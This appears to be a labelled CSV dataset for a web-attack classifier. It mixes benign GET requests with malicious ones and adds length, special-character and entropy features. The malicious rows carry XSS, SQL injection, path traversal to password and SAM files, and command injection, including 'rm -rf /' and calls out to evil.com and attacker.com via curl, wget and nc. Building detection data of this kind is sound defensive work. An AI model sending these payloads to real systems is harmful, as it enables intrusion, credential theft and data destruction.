payload,label,length,special_ratio,entropy
GET /login?color=blue HTTP/1.1,0,30.0,0.0,4.231401845392172
GET /index.html?page=1 HTTP/1.1,0,31.0,0.0,4.389364858634393
GET /comment?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,56.0,0.14285714285714285,4.662016252639434
GET /file?file=..//..//..//etc/passwd HTTP/1.1,1,46.0,0.0,4.008549250150252
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /blog?limit=10 HTTP/1.1,0,27.0,0.0,4.106377316818028
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /index.html?limit=10&category=electronics HTTP/1.1,0,54.0,0.018518518518518517,4.6619328723735824
"GET /search?user=%27%20UNION%20ALL%20SELECT%20NULL,NULL-- HTTP/1.1",1,66.0,0.0,4.67499199197052
GET /post?q=%3Caudio src=x onerror=alert(1)%3E HTTP/1.1,1,55.0,0.03636363636363636,4.729099659325981
GET /api/products?category=electronics&id=123&size=medium HTTP/1.1,0,66.0,0.030303030303030304,4.741162778928989
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /search?page=1&size=medium&id=123 HTTP/1.1,0,46.0,0.043478260869565216,4.561286684176786
GET /ping?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,49.0,0.061224489795918366,4.624315456095191
GET /dashboard?q=search+term&category=electronics&limit=10 HTTP/1.1,0,67.0,0.029850746268656716,4.726557758191287
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /image?file=../../../etc/passwd HTTP/1.1,1,44.0,0.0,4.216908108113273
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /search?q=%3Cselect onfocus=alert(1) autofocus%3E HTTP/1.1,1,62.0,0.03225806451612903,4.667511834405949
GET /register?page=1 HTTP/1.1,0,29.0,0.0,4.090234012145144
GET /login?size=medium HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /index.html?size=medium&color=blue HTTP/1.1,0,47.0,0.02127659574468085,4.6392792770254285
GET /command?cmd=hostname; rm -rf / HTTP/1.1,1,44.0,0.022727272727272728,4.397407619700921
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /post?q=%3Cimg src='x' onerror='alert(1)'%3E HTTP/1.1,1,57.0,0.10526315789473684,4.769220005689465
GET /command?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,52.0,0.038461538461538464,4.334679141051594
GET /dashboard?limit=10 HTTP/1.1,0,32.0,0.0,4.390319531114783
GET /api/products?sort=name&id=123 HTTP/1.1,0,43.0,0.023255813953488372,4.629412138272087
GET /image?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,61.0,0.09836065573770492,4.563099272559269
GET /products.html?price=100&limit=10 HTTP/1.1,0,46.0,0.021739130434782608,4.544876086303668
GET /dashboard?color=blue HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /search?id=123 HTTP/1.1,0,27.0,0.0,4.254525464966176
GET /settings?q=search+term HTTP/1.1,0,36.0,0.0,4.4193819456463705
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /api/user?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,56.0,0.05357142857142857,4.758621780036169
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /search?color=blue HTTP/1.1,0,31.0,0.0,4.284683810317086
GET /login?user='; DROP TABLE users-- HTTP/1.1,1,46.0,0.043478260869565216,4.6460722174352656
GET /contact.html?category=electronics&id=123 HTTP/1.1,0,54.0,0.018518518518518517,4.63935359554259
GET /comment?q=%3Ckeygen onfocus=alert(1) autofocus%3E HTTP/1.1,1,63.0,0.031746031746031744,4.800470947509161
GET /command?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,56.0,0.017857142857142856,4.554873395496577
GET /command?cmd=hostname$(whoami) HTTP/1.1,1,43.0,0.06976744186046512,4.498955383052627
GET /settings?limit=10 HTTP/1.1,0,31.0,0.0,4.147114052043201
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /search?q=%3Cvideo%3E%3Csource onerror='alert(1)'%3E HTTP/1.1,1,65.0,0.06153846153846154,4.727922190145107
GET /search?user=' OR '1'='1 HTTP/1.1,1,37.0,0.10810810810810811,4.162023973678587
GET /ping?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,53.0,0.018867924528301886,4.569730303898026
GET /command?cmd=hostname$(whoami) HTTP/1.1,1,43.0,0.06976744186046512,4.498955383052627
GET /profile?user=' UNION SELECT * FROM users-- HTTP/1.1,1,56.0,0.017857142857142856,4.759657878074444
GET /profile?user=1' AND '1'='1 HTTP/1.1,1,40.0,0.1,4.312814895472355
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /contact.html?price=100 HTTP/1.1,0,36.0,0.0,4.41938194564637
GET /comment?q=%3Cimg src=x onerror=alert('XSS')%3E HTTP/1.1,1,60.0,0.06666666666666667,4.850489295854282
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /dashboard?q=search+term&id=123&price=100 HTTP/1.1,0,54.0,0.037037037037037035,4.722027548259444
GET /profile?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,55.0,0.05454545454545454,4.836374832596711
GET /index.html?sort=name&color=blue&category=electronics HTTP/1.1,0,66.0,0.030303030303030304,4.659786877157634
GET /api/user?user=1' ORDER BY 10-- HTTP/1.1,1,44.0,0.022727272727272728,4.479444903210848
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /document?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /post?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,73.0,0.0821917808219178,4.7275633481374975
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /products.html?filter=active&price=100&q=search+term HTTP/1.1,0,65.0,0.03076923076923077,4.732391329459774
GET /search?size=medium&q=search+term HTTP/1.1,0,46.0,0.021739130434782608,4.50988390207678
GET /login?user=1' ORDER BY 10-- HTTP/1.1,1,41.0,0.024390243902439025,4.5681732734814915
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /search?limit=10&filter=active&id=123 HTTP/1.1,0,50.0,0.04,4.591272380112912
GET /profile?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.900025150061047
GET /login?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,53.0,0.05660377358490566,4.822747464920989
GET /api/products?price=100 HTTP/1.1,0,36.0,0.0,4.363826390090815
GET /ping?cmd=hostname`id` HTTP/1.1,1,35.0,0.05714285714285714,4.536286231168866
GET /register?limit=10&filter=active HTTP/1.1,0,45.0,0.022222222222222223,4.38353525230907
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /exec?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,53.0,0.018867924528301886,4.59322299253645
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /file?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,59.0,0.0,4.33753695684099
GET /settings?page=1 HTTP/1.1,0,29.0,0.0,4.1162646156680225
GET /exec?cmd=hostname; ls -la HTTP/1.1,1,39.0,0.02564102564102564,4.477459270033353
GET /docs?q=search+term HTTP/1.1,0,32.0,0.0,4.413909765557392
GET /login?page=1&limit=10&color=blue HTTP/1.1,0,46.0,0.043478260869565216,4.544876086303668
GET /register?price=100&limit=10 HTTP/1.1,0,41.0,0.024390243902439025,4.308294687333842
GET /products.html?size=medium&filter=active&price=100 HTTP/1.1,0,63.0,0.031746031746031744,4.711429035216512
GET /dashboard?price=100&sort=name&color=blue HTTP/1.1,0,54.0,0.037037037037037035,4.684990511222407
GET /login?user=' OR 1=1 -- HTTP/1.1,1,36.0,0.027777777777777776,4.326465890981192
GET /ping?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,61.0,0.03278688524590164,4.719683190334569
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /about.html?id=123 HTTP/1.1,0,31.0,0.0,4.389364858634393
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /document?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,55.0,0.0,4.56024590518411
GET /image?file=../../../../../../etc/passwd HTTP/1.1,1,53.0,0.0,3.913867315824671
GET /comment?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.782639243749498
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /api/users?color=blue&size=medium&page=1 HTTP/1.1,0,53.0,0.03773584905660377,4.578979832118272
GET /profile?page=1&limit=10&price=100 HTTP/1.1,0,47.0,0.0425531914893617,4.418757405182869
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /dashboard?page=1&filter=active HTTP/1.1,0,44.0,0.022727272727272728,4.635234743489787
GET /profile?q=search+term HTTP/1.1,0,35.0,0.0,4.550292659616668
GET /dashboard?filter=active HTTP/1.1,0,37.0,0.0,4.5199999871336285
GET /login?sort=name HTTP/1.1,0,29.0,0.0,4.349191770915039
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /dashboard?color=blue HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /api/products?page=1 HTTP/1.1,0,33.0,0.0,4.346831997884095
GET /command?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,56.0,0.017857142857142856,4.554873395496577
GET /products.html?page=1 HTTP/1.1,0,34.0,0.0,4.513645929358369
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /search?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.68082653147046
GET /contact.html?sort=name&color=blue&page=1 HTTP/1.1,0,54.0,0.037037037037037035,4.582957640771908
GET /search?size=medium&category=electronics&id=123 HTTP/1.1,0,60.0,0.03333333333333333,4.718820387022781
GET /search?size=medium&price=100 HTTP/1.1,0,42.0,0.023809523809523808,4.4812540297670855
GET /login?color=blue&sort=name HTTP/1.1,0,40.0,0.025,4.534183719779189
GET /login?user=1' ORDER BY 10-- HTTP/1.1,1,41.0,0.024390243902439025,4.5681732734814915
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /download?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,64.0,0.09375,4.57912973485082
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /exec?cmd=hostname; sleep 10 HTTP/1.1,1,41.0,0.024390243902439025,4.452200407575065
GET /search?page=1&color=blue&sort=name HTTP/1.1,0,48.0,0.041666666666666664,4.573934896284057
GET /document?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.415337750470313
GET /search?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,75.0,0.08,4.773371817214928
GET /api/users?q=search+term HTTP/1.1,0,37.0,0.0,4.404738838309562
GET /post?q=<script>alert(document.cookie)</script> HTTP/1.1,1,60.0,0.1,4.7253263791155
GET /search?category=electronics&page=1&filter=active HTTP/1.1,0,62.0,0.03225806451612903,4.530314456556328
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /products.html?sort=name&q=search+term HTTP/1.1,0,51.0,0.0196078431372549,4.63282632219397
GET /document?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,64.0,0.09375,4.629834617629516
GET /api/products?filter=active&limit=10&page=1 HTTP/1.1,0,56.0,0.03571428571428571,4.626301966925148
GET /index.html?q=search+term&id=123 HTTP/1.1,0,45.0,0.022222222222222223,4.730416151740998
GET /register?filter=active&category=electronics HTTP/1.1,0,57.0,0.017543859649122806,4.400861015823683
GET /api/users?q=search+term&sort=name&category=electronics HTTP/1.1,0,68.0,0.029411764705882353,4.590544459752975
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /register?limit=10&color=blue&id=123 HTTP/1.1,0,49.0,0.04081632653061224,4.59890499695567
GET /download?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,3.983340344322928
GET /products.html?category=electronics HTTP/1.1,0,48.0,0.0,4.6053885422075345
GET /search?user=1' ORDER BY 1-- HTTP/1.1,1,41.0,0.024390243902439025,4.421831810066857
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,55.0,0.0,4.487518632456837
GET /products.html?q=search+term&size=medium HTTP/1.1,0,53.0,0.018867924528301886,4.689815737418786
GET /products.html?q=search+term&limit=10 HTTP/1.1,0,50.0,0.02,4.703465189601647
GET /register?q=search+term&category=electronics HTTP/1.1,0,57.0,0.017543859649122806,4.4877841463918084
GET /blog?q=search+term HTTP/1.1,0,32.0,0.0,4.538909765557392
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /command?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,52.0,0.057692307692307696,4.474008227548451
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /profile?id=123&price=100 HTTP/1.1,0,38.0,0.02631578947368421,4.418722908066561
GET /run?cmd=hostname| curl http://evil.com HTTP/1.1,1,52.0,0.019230769230769232,4.68083298720544
GET /dashboard?limit=10&price=100 HTTP/1.1,0,42.0,0.023809523809523808,4.57649212500518
GET /blog?filter=active HTTP/1.1,0,32.0,0.0,4.413909765557392
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /dashboard?color=blue&limit=10&page=1 HTTP/1.1,0,50.0,0.04,4.6883674395583785
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /profile?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.833616975397235
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /register?filter=active&limit=10 HTTP/1.1,0,45.0,0.022222222222222223,4.38353525230907
GET /document?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /document?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,63.0,0.0,4.530275805107375
GET /settings?size=medium HTTP/1.1,0,34.0,0.0,4.233946664525225
GET /command?cmd=hostname`id` HTTP/1.1,1,38.0,0.05263157894736842,4.366091329119192
GET /search?q=search+term&category=electronics&sort=name HTTP/1.1,0,65.0,0.03076923076923077,4.498743775495265
GET /post?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,57.0,0.10526315789473684,4.902722470153268
GET /document?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.250044500340504
GET /profile?user=%27%20OR%201=1%20-- HTTP/1.1,1,46.0,0.0,4.5342190211803395
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /dashboard?limit=10&id=123&filter=active HTTP/1.1,0,53.0,0.03773584905660377,4.6829378510678366
GET /about.html?page=1&filter=active&limit=10 HTTP/1.1,0,54.0,0.037037037037037035,4.618145317251354
GET /document?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.17758749715467
GET /search?q=javascript:alert('XSS') HTTP/1.1,1,46.0,0.08695652173913043,4.751610325528165
GET /post?q=<script>alert('XSS')</script> HTTP/1.1,1,50.0,0.16,4.688367439558378
GET /comment?q=%3Cbody onload=alert('XSS')%3E HTTP/1.1,1,54.0,0.07407407407407407,4.875076853935194
GET /api/users?price=100&size=medium HTTP/1.1,0,45.0,0.022222222222222223,4.402529762804032
GET /search?filter=active HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /download?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.170044500340504
GET /ping?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.532678211285537
GET /dashboard?color=blue&sort=name&category=electronics HTTP/1.1,0,65.0,0.03076923076923077,4.599237144351258
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /docs?category=electronics&size=medium HTTP/1.1,0,51.0,0.0196078431372549,4.601264744263836
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /login?user=' UNION SELECT * FROM users-- HTTP/1.1,1,54.0,0.018518518518518517,4.770419734409208
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /login?size=medium&id=123 HTTP/1.1,0,38.0,0.02631578947368421,4.4713544870139295
GET /contact.html?color=blue&size=medium HTTP/1.1,0,49.0,0.02040816326530612,4.649725915234713
GET /blog?filter=active&sort=name&price=100 HTTP/1.1,0,52.0,0.038461538461538464,4.690260390968384
GET /docs?id=123&filter=active HTTP/1.1,0,39.0,0.02564102564102564,4.560667282798391
GET /api/products?color=blue HTTP/1.1,0,37.0,0.0,4.4455435681562365
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /contact.html?price=100&q=search+term HTTP/1.1,0,50.0,0.02,4.623465189601648
GET /ping?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,61.0,0.03278688524590164,4.719683190334569
GET /api/users?color=blue HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /post?q=%3Cscript%3Edocument.location='http://evil.com'%3C/script%3E HTTP/1.1,1,81.0,0.024691358024691357,4.7904678314479865
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /run?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,48.0,0.041666666666666664,4.4803885422075345
GET /login?user='; DROP TABLE users-- HTTP/1.1,1,46.0,0.043478260869565216,4.6460722174352656
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /download?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.335337750470313
GET /api/products?size=medium HTTP/1.1,0,38.0,0.0,4.4514890264306795
GET /login?category=electronics&limit=10&id=123 HTTP/1.1,0,56.0,0.03571428571428571,4.6485361186722285
GET /profile?user=' OR '1'='1'/* HTTP/1.1,1,41.0,0.12195121951219512,4.305858944160431
GET /exec?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.3970552088742005
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /api/products?size=medium HTTP/1.1,0,38.0,0.0,4.4514890264306795
GET /search?user=1' AND '1'='2 HTTP/1.1,1,39.0,0.10256410256410256,4.291687154704211
GET /api/products?page=1 HTTP/1.1,0,33.0,0.0,4.346831997884095
GET /api/users?category=electronics&page=1&id=123 HTTP/1.1,0,58.0,0.034482758620689655,4.657140641821631
GET /contact.html?filter=active HTTP/1.1,0,40.0,0.0,4.393942707918268
GET /search?user=' UNION SELECT * FROM users-- HTTP/1.1,1,55.0,0.01818181818181818,4.655611586962955
GET /search?user=%27%20WAITFOR%20DELAY%20%2700:00:05%27-- HTTP/1.1,1,66.0,0.0,4.714478399497588
GET /dashboard?price=100 HTTP/1.1,0,33.0,0.0,4.392582755590972
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /search?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,75.0,0.08,4.773371817214928
GET /image?file=..;/..;/..;/etc/passwd HTTP/1.1,1,47.0,0.06382978723404255,4.290207533268688
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /blog?limit=10 HTTP/1.1,0,27.0,0.0,4.106377316818028
GET /about.html?q=search+term&limit=10&price=100 HTTP/1.1,0,57.0,0.03508771929824561,4.687552952495542
GET /search?user=' OR 'a'='a HTTP/1.1,1,37.0,0.10810810810810811,4.195675662809304
GET /download?file=..;/..;/..;/etc/passwd HTTP/1.1,1,50.0,0.06,4.335337750470313
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /dashboard?category=electronics&limit=10 HTTP/1.1,0,53.0,0.018867924528301886,4.6940716334411
GET /about.html?page=1&size=medium&color=blue HTTP/1.1,0,54.0,0.037037037037037035,4.694068751883018
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /post?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.59946860789152
GET /login?page=1&price=100&color=blue HTTP/1.1,0,47.0,0.0425531914893617,4.495558266341099
GET /post?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,51.0,0.0784313725490196,4.655282146267043
GET /docs?page=1&sort=name&price=100 HTTP/1.1,0,45.0,0.044444444444444446,4.552638373963221
GET /search?filter=active&q=search+term HTTP/1.1,0,48.0,0.020833333333333332,4.488521032323434
GET /profile?user=1' AND '1'='1 HTTP/1.1,1,40.0,0.1,4.312814895472355
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /blog?size=medium&sort=name&color=blue HTTP/1.1,0,51.0,0.0392156862745098,4.63282632219397
GET /document?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,64.0,0.09375,4.629834617629516
GET /search?filter=active HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /blog?sort=name&filter=active HTTP/1.1,0,42.0,0.023809523809523808,4.624111172624228
GET /contact.html?filter=active HTTP/1.1,0,40.0,0.0,4.393942707918268
GET /api/users?q=search+term HTTP/1.1,0,37.0,0.0,4.404738838309562
GET /run?cmd=hostname| curl http://evil.com HTTP/1.1,1,52.0,0.019230769230769232,4.68083298720544
GET /document?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.348822160974294
GET /download?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.106158925726099
GET /login?user=admin'/* HTTP/1.1,1,33.0,0.030303030303030304,4.513794876803092
GET /blog?size=medium&limit=10&q=search+term HTTP/1.1,0,53.0,0.03773584905660377,4.741794746893568
GET /api/user?user=1%27%20AND%20%271%27=%272 HTTP/1.1,1,53.0,0.0,4.319033011864008
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /login?category=electronics HTTP/1.1,0,40.0,0.0,4.396439344671015
GET /about.html?category=electronics HTTP/1.1,0,45.0,0.0,4.580307540581811
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,55.0,0.10909090909090909,4.803642667873433
